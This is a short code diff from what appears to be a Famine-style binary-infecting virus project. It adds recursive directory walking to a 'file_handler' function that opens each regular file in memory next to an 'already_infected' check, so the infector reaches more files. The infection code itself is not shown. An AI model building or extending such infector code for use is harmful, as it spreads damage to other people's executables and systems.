@@ -1,4 +1,4 @@
-#include "ft_famine.h"
+#include <ft_famine.h>
 
 static bool handle_file_format(t_binary *binary)
 {
@@ -16,7 +16,7 @@ static bool already_infected(t_binary *binary, const char *famine)
     return true;
 }
 
-int file_handler(char *path)
+int file_handler(char *path, bool recursive)
 {
     struct dirent   *dir;
     DIR             *tmp = opendir(path);
@@ -26,11 +26,35 @@ int file_handler(char *path)
     {
         while((dir = readdir(tmp)) != NULL)
         {
+            if(recursive)
+            {
+                if(!ft_strcmp(dir->d_name, ".") || !ft_strcmp(dir->d_name, ".."))
+                    continue;
+                if(dir->d_type == DT_DIR)
+                {
+                    full_path = build_path(path, dir->d_name);
+                    if(full_path)
+                    {
+                        ret = file_handler(full_path, false);
+                        free(full_path);
+                        full_path = NULL;
+                        if (ret)
+                        {
+                            closedir(tmp);
+                            return ret;
+                        }
+                    }
+                    continue;
+                }   
+            }
             if(dir->d_type == DT_REG)
             {
                 t_binary *binary = ft_calloc(1, sizeof(t_binary));
                 if(!binary)
+                {
+                    closedir(tmp);
                     return 1;
+                }
                 full_path = build_path(path, dir->d_name);
                 open_binary_in_memory(full_path, binary);
                 if(!binary->buffer)
